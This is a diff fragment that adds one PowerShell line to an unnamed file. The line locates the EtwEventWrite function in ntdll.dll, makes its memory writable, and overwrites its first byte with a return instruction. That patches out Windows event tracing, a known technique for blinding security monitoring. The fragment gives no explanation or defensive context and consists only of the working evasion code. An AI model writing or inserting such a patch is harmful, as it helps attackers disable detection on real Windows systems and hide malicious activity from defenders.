@@ -1,0 +1,2 @@
+Add-Type $s; $a = GetProcAddress (LoadLibrary "ntdll.dll") "EtwEventWrite"; VirtualProtect($a, 1, 0x40, [ref]$o); [Marshal]::Copy(@(0xc3),0,$a,1)
+
